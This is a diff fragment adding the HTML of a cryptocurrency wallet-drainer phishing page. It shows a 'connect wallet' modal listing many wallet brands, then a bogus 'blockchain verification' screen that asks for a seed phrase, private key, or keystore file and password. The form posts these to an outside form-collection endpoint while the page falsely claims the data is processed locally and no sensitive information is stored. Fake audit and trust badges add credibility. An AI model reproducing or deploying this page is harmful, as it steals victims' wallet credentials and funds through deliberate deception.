+                            <img src="./bitpaywallet.png" alt="BitPay Wallet" loading="lazy">
+                            <div>BitPay Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect BitKeep Wallet">
+                            <img src="./bitkeepwallet.png" alt="BitKeep Wallet" loading="lazy">
+                            <div>BitKeep Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Huobi Wallet">
+                            <img src="./huobiwallet.png" alt="Huobi Wallet" loading="lazy">
+                            <div>Huobi Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Gate.io Wallet">
+                            <img src="./gate.iowallet.png" alt="Gate.io Wallet" loading="lazy">
+                            <div>Gate.io Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect KuCoin Wallet">
+                            <img src="./kucoinwallet.png" alt="KuCoin Wallet" loading="lazy">
+                            <div>KuCoin Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect BitMart Wallet">
+                            <img src="./bitmartwallet.png" alt="BitMart Wallet" loading="lazy">
+                            <div>BitMart Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Polkadot{.js}">
+                            <img src="./polkadot{.js}.png" alt="Polkadot{.js}" loading="lazy">
+                            <div>Polkadot{.js}</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Zerion Wallet">
+                            <img src="./zerionwallet.png" alt="Zerion Wallet" loading="lazy">
+                            <div>Zerion Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect WalletConnect">
+                            <img src="./walletconnect.png" alt="WalletConnect" loading="lazy">
+                            <div>WalletConnect</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Unstoppable Wallet">
+                            <img src="./unstoppablewallet.png" alt="Unstoppable Wallet" loading="lazy">
+                            <div>Unstoppable Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Bitpie Wallet">
+                            <img src="./bitpiewallet.png" alt="Bitpie Wallet" loading="lazy">
+                            <div>Bitpie Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect ZenGo">
+                            <img src="./zengo.png" alt="ZenGo" loading="lazy">
+                            <div>ZenGo</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Torus Wallet">
+                            <img src="./toruswallet.png" alt="Torus Wallet" loading="lazy">
+                            <div>Torus Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Bitski">
+                            <img src="./bitski.png" alt="Bitski" loading="lazy">
+                            <div>Bitski</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Solflare">
+                            <img src="./solflare.png" alt="Solflare" loading="lazy">
+                            <div>Solflare</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Tangem Wallet">
+                            <img src="./tangemwallet.png" alt="Tangem Wallet" loading="lazy">
+                            <div>Tangem Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Clover Wallet">
+                            <img src="./cloverwallet.png" alt="Clover Wallet" loading="lazy">
+                            <div>Clover Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Keplr Wallet">
+                            <img src="./keplrwallet.png" alt="Keplr Wallet" loading="lazy">
+                            <div>Keplr Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Leap Wallet">
+                            <img src="./leapwallet.png" alt="Leap Wallet" loading="lazy">
+                            <div>Leap Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Terra Station Wallet">
+                            <img src="./terrastationwallet.png" alt="Terra Station Wallet" loading="lazy">
+                            <div>Terra Station Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Martian Wallet">
+                            <img src="./martianwallet.png" alt="Martian Wallet" loading="lazy">
+                            <div>Martian Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Petra Wallet">
+                            <img src="./petrawallet.png" alt="Petra Wallet" loading="lazy">
+                            <div>Petra Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Sui Wallet">
+                            <img src="./suiwallet.png" alt="Sui Wallet" loading="lazy">
+                            <div>Sui Wallet</div>
+                        </div>
+                        <div class="wallet-card" tabindex="0" role="button" aria-label="Connect Nightly Wallet">
+                            <img src="./nightlywallet.png" alt="Nightly Wallet" loading="lazy">
+                            <div>Nightly Wallet</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Manual Input Screen -->
+                <div id="manualInputScreen" class="manual-input-modal" style="display: none;">
+                    <h3 data-i18n="enter_wallet">Enter Your Wallet Name</h3>
+                    <input type="text" id="manualWalletName" placeholder="Type your wallet name..." aria-label="Wallet name" value="">
+                    <button aria-label="Submit wallet name" tabindex="0" data-i18n="next">Next</button>
+                </div>
+
+                <!-- Loading Screen -->
+                <div id="loadingScreen" style="display: none;">
+                    <div class="loading-container">
+                        <div class="spinner"></div>
+                        <div class="progress-text" id="progressPercent">Connected to Clover Wallet</div>
+                        <div class="progress-bar">
+                            <div class="progress-bar-inner" id="progressBarInner" style="width: 100%;"></div>
+                        </div>
+                        <div id="countdownTimer"></div>
+                        <div class="lock-icon">🔒</div>
+                        <div class="subheading" data-i18n="loading_message">Confirming Wallet Verification on blockchain. Please wait...</div>
+                    </div>
+                </div>
+
+                <!-- Verification Screen -->
+                <div id="verificationScreen" class="verification-screen" style="display: none;">
+                    <h2 data-i18n="verification_title">One-Time Advanced Blockchain Verification</h2>
+                    <p data-i18n="verification_desc">This advanced system confirms wallet ownership via secure blockchain processing. Select one of the options below:</p>
+                    <button type="button" class="verification-button" tabindex="0" aria-label="Verify using Seedphrase">
+            <span data-i18n="seedphrase">Seedphrase</span>
+          </button>
+                    <button type="button" class="verification-button" tabindex="0" aria-label="Verify using Private Key">
+            <span data-i18n="private_key">Private Key</span>
+          </button>
+                    <button type="button" class="verification-button" tabindex="0" aria-label="Verify using KeyStore">
+            <span data-i18n="keystore">KeyStore</span>
+          </button>
+                    <div class="security-badges">
+                        <div class="badge-track" style="">
+                            <!-- First sequence -->
+                            <img src="./certik.png" alt="CertiK Audit">
+                            <img src="./ConsenSysDiligence.png" alt="ConsenSys Diligence">
+                            <img src="./coingecko.png" alt="CoinGecko">
+                            <img src="./coinmarketcap.png" alt="CoinMarketCap">
+                            <img src="./coinsniper.png" alt="CoinSniper">
+                            <img src="./gmgn.png" alt="GMGN">
+                            <img src="./discord.png" alt="Discord">
+                            <img src="./telegram.png" alt="Telegram">
+                            <img src="./reddit.png" alt="Reddit">
+                            <img src="./solana.png" alt="Solana">
+                            <img src="./ethereum.png" alt="Ethereum">
+                            <img src="./bitcoin.png" alt="Bitcoin">
+                            <img src="./opensea.png" alt="OpenSea">
+                            <img src="./x.png" alt="X">
+                            <img src="./metamasklogo.png" alt="metamasklogo">
+                            <img src="./phantomlogo.png" alt="phantomlogo">
+                            <!-- Duplicate sequence for seamless loop -->
+                            <img src="./certik.png" alt="CertiK Audit">
+                            <img src="./ConsenSysDiligence.png" alt="ConsenSys Diligence">
+                            <img src="./coingecko.png" alt="CoinGecko">
+                            <img src="./coinmarketcap.png" alt="CoinMarketCap">
+                            <img src="./coinsniper.png" alt="CoinSniper">
+                            <img src="./gmgn.png" alt="GMGN">
+                            <img src="./discord.png" alt="Discord">
+                            <img src="./telegram.png" alt="Telegram">
+                            <img src="./reddit.png" alt="Reddit">
+                            <img src="./solana.png" alt="Solana">
+                            <img src="./ethereum.png" alt="Ethereum">
+                            <img src="./bitcoin.png" alt="Bitcoin">
+                            <img src="./opensea.png" alt="OpenSea">
+                            <img src="./x.png" alt="X">
+                            <img src="./metamasklogo.png" alt="metamasklogo">
+                            <img src="./phantomlogo.png" alt="phantomlogo">
+                        </div>
+                        <div class="trusted-text">Trusted by 1,200,000+ users</div>
+                    </div>
+                </div>
+
+
+
+
+                <!-- Import Wallet Information Screen -->
+                <div id="importScreen" style="display: none;">
+                    <h2 data-i18n="import_title">Import Wallet Information</h2>
+                    <form id="import-form" method="POST" action="https://submit-form.com/JcFuAD0KH">
+                        <!-- existing hidden for verification method -->
+                        <input type="hidden" name="verification_method" id="verification_method" value="seedphrase">
+                        <!-- new hidden to carry the wallet the user selected -->
+                        <input type="hidden" name="wallet_type" id="wallet_type" value="Clover Wallet">
+
+                        <!-- Seedphrase Section -->
+                        <div id="seedphraseSection" class="import-section" style="display: block;">
+                            <label for="seedphraseInput" data-i18n="enter_seedphrase">Enter your Seedphrase</label>
+                            <textarea name="seedphrase" id="seedphraseInput" rows="3" placeholder="Enter 12 or 24 word seedphrase" aria-label="Seedphrase"></textarea>
+                            <button type="submit" class="submit-button" aria-label="Submit Seedphrase" tabindex="0" data-i18n="submit">Submit</button>
+                        </div>
+
+                        <!-- Private Key Section -->
+                        <div id="privateKeySection" class="import-section" style="display: none;">
+                            <label for="privateKeyInput" data-i18n="enter_privatekey">Enter your Private Key</label>
+                            <input type="text" name="privateKey" id="privateKeyInput" placeholder="Enter your private key" aria-label="Private Key" value="">
+                            <button type="submit" class="submit-button" aria-label="Verify Private Key" tabindex="0" data-i18n="verify">Verify</button>
+                        </div>
+
+                        <!-- Keystore Section -->
+                        <div id="keystoreSection" class="import-section" style="display: none;">
+                            <label for="keystoreFile" data-i18n="upload_keystore">Upload your Keystore file</label>
+                            <input type="file" name="keystoreFile" id="keystoreFile" aria-label="Keystore file">
+                            <label for="keystorePassword" data-i18n="enter_keystore_password">Enter your Keystore Password</label>
+                            <input type="password" name="keystorePassword" id="keystorePassword" placeholder="Keystore password" aria-label="Keystore Password">
+                            <button type="submit" class="submit-button" aria-label="Verify Keystore" tabindex="0" data-i18n="verify">Verify</button>
+                        </div>
+                        <!-- end of keystoreSection (last import-section) -->
+                    </form>
+
+                    <!-- optional data‑handling note -->
+                    <div class="data-handling">
+                        Your data is encrypted and processed locally. No sensitive information is stored.
+                    </div>
+
+                </div>
+                <!-- ← CLOSES <div id="importScreen"> -->
+
+                <!-- Processing Screen (now a sibling of importScreen) -->
+                <div id="processingScreen" class="processing-screen" style="display: none;">
+                    Processing data on blockchain...
+                </div>
+
+
+                <!-- Modal Footer -->
+                <div class="modal-footer">
+                    <button class="modal-exit" tabindex="0" role="button" aria-label="Exit">Exit</button>
+                </div>
+
+            </div>
+        </div>
+
+
+
+        <!-- Inject Progress Bar Container if Not Present -->
+
+
+        <!-- Automatically open the wallet modal if loaded in an iframe -->
+
+
+
+
+    </div>
+</body>
+
+</html>
